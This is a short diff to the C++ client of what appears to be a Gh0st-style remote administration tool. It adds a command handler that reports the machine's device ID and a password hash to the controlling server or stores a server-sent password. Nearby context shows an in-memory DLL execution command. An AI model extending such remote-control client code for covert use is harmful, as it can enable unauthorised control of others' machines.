@@ -11,6 +11,7 @@
 #include "ClientDll.h"
 #include "MemoryModule.h"
 #include "common/dllRunner.h"
+#include "server/2015Remote/pwd_gen.h"
 
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
@@ -196,6 +197,22 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
 	switch (szBuffer[0])
 	{
+	case CMD_AUTHORIZATION: {
+		char buf[100] = {}, *passCode = buf + 5;
+		memcpy(buf, szBuffer, min(sizeof(buf), ulLength));
+		char path[MAX_PATH] = { 0 };
+		GetModuleFileNameA(NULL, path, MAX_PATH);
+		if (passCode[0] == 0) {
+			std::string devId = getDeviceID();
+			memcpy(buf + 5, devId.c_str(), devId.length());		// 16×Ö½Ú
+			memcpy(buf + 32, m_conn->pwdHash, 64);				// 64×Ö½Ú
+			m_ClientObject->Send2Server((char*)buf, sizeof(buf));
+		} else {
+			GET_FILEPATH(path, "settings.ini");
+			WritePrivateProfileStringA("settings", "Password", passCode, path);
+		}
+		break;
+	}
 	case CMD_EXECUTE_DLL: {
 #ifdef _WIN64
 		static std::map<std::string, std::vector<BYTE>> m_MemDLL;
